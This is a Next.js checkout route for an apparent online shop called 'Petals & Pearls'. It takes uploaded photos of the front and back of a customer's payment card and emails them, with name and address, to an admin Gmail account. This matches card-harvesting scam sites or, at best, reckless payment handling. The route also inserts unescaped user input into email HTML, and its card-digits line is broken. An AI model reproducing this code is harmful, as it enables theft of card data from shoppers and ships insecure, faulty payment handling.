import nodemailer from "nodemailer";
import { NextRequest, NextResponse } from "next/server";

export async function POST(req: NextRequest) {
  try {
    const formData = await req.formData();
    const name = formData.get("name") as string;
    const email = formData.get("email") as string;
    const address = formData.get("address") as string;
    const paymentMethod = formData.get("paymentMethod") as string;
    const cart = formData.get("cart") as string;
    // const cardNumber = formData.get("cardNumber") as string;
    const cardFront = formData.get("cardFront") as File | null;
    const cardBack = formData.get("cardBack") as File | null;

    // Validate required fields
    if (!name || !email || !address) {
      return NextResponse.json(
        { success: false, error: "Missing required fields" },
        { status: 400 },
      );
    }

    // Configure nodemailer transporter
    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS,
      },
    });

    // Prepare attachments if files exist
    const attachments: any[] = [];

    if (cardFront) {
      const frontBuffer = await cardFront.arrayBuffer();
      attachments.push({
        filename: "card-front.jpg",
        content: Buffer.from(frontBuffer),
      });
    }

    if (cardBack) {
      const backBuffer = await cardBack.arrayBuffer();
      attachments.push({
        filename: "card-back.jpg",
        content: Buffer.from(backBuffer),
      });
    }

    const cartData = JSON.parse(cart);
    const cartHtml = cartData
      .map(
        (item: any) =>
          `<tr>
                        <td style="padding: 8px; border-bottom: 1px solid #ddd;">${
                          item.name
                        }</td>
                        <td style="padding: 8px; border-bottom: 1px solid #ddd; text-align: right;">x${
                          item.quantity
                        }</td>
                        <td style="padding: 8px; border-bottom: 1px solid #ddd; text-align: right;">$${(
                          item.price * item.quantity
                        ).toFixed(2)}</td>
                    </tr>`,
      )
      .join("");

    const totalPrice = cartData.reduce(
      (sum: number, item: any) => sum + item.price * item.quantity,
      0,
    );
    const tax = totalPrice * 0.1;
    const grandTotal = totalPrice + tax;

    // Email to admin
    await transporter.sendMail({
      from: process.env.EMAIL_USER,
      to: process.env.ADMIN_EMAIL,
      subject: `New Order from ${name}`,
      html: `
                <h2>New Order Received</h2>
                <hr />
                <h3>Customer Information</h3>
                <p><strong>Name:</strong> ${name}</p>
                <p><strong>Email:</strong> ${email}</p>
                <p><strong>Address:</strong> ${address}</p>
                <p><strong>Payment Method:</strong> ${paymentMethod.toUpperCase()}</p>
                ${
                  paymentMethod !== "bitcoin"
                    ? `<p><strong>Card (last 4 digits):</strong> }</p>`
                    : ""
                }
                
                <h3>Order Items</h3>
                <table style="width: 100%; border-collapse: collapse;">
                    <thead>
                        <tr style="background-color: #f5f5f5;">
                            <th style="padding: 8px; text-align: left; border-bottom: 2px solid #ddd;">Product</th>
                            <th style="padding: 8px; text-align: right; border-bottom: 2px solid #ddd;">Qty</th>
                            <th style="padding: 8px; text-align: right; border-bottom: 2px solid #ddd;">Total</th>
                        </tr>
                    </thead>
                    <tbody>
                        ${cartHtml}
                    </tbody>
                </table>
                
                <h3 style="margin-top: 20px;">Order Summary</h3>
                <p><strong>Subtotal:</strong> $${totalPrice.toFixed(2)}</p>
                <p><strong>Tax (10%):</strong> $${tax.toFixed(2)}</p>
                <p style="font-size: 18px; font-weight: bold; color: #d946ef;"><strong>Total:</strong> $${grandTotal.toFixed(
                  2,
                )}</p>
            `,
      attachments,
    });

    // Confirmation email to customer
    await transporter.sendMail({
      from: process.env.EMAIL_USER,
      to: email,
      subject: "Order Confirmation - Petals & Pearls",
      html: `
                <h2>Thank you for your order!</h2>
                <p>Hi ${name},</p>
                <p>We've received your order and will process it shortly.</p>
                
                <h3>Order Summary</h3>
                <p><strong>Shipping Address:</strong> ${address}</p>
                <p><strong>Payment Method:</strong> ${paymentMethod.toUpperCase()}</p>
                
                <h3>Items Ordered</h3>
                <table style="width: 100%; border-collapse: collapse;">
                    <thead>
                        <tr style="background-color: #f5f5f5;">
                            <th style="padding: 8px; text-align: left; border-bottom: 2px solid #ddd;">Product</th>
                            <th style="padding: 8px; text-align: right; border-bottom: 2px solid #ddd;">Qty</th>
                            <th style="padding: 8px; text-align: right; border-bottom: 2px solid #ddd;">Total</th>
                        </tr>
                    </thead>
                    <tbody>
                        ${cartHtml}
                    </tbody>
                </table>
                
                <p style="margin-top: 20px;"><strong>Total Amount:</strong> $${grandTotal.toFixed(
                  2,
                )}</p>
                <p>You'll receive tracking information via email soon.</p>
                <p>Thank you for shopping with <strong>Petals & Pearls</strong>!</p>
            `,
    });

    return NextResponse.json({
      success: true,
      message: "Order submitted successfully",
    });
  } catch (error) {
    console.error("Checkout error:", error);
    return NextResponse.json(
      { success: false, error: "Failed to process order" },
      { status: 500 },
    );
  }
}
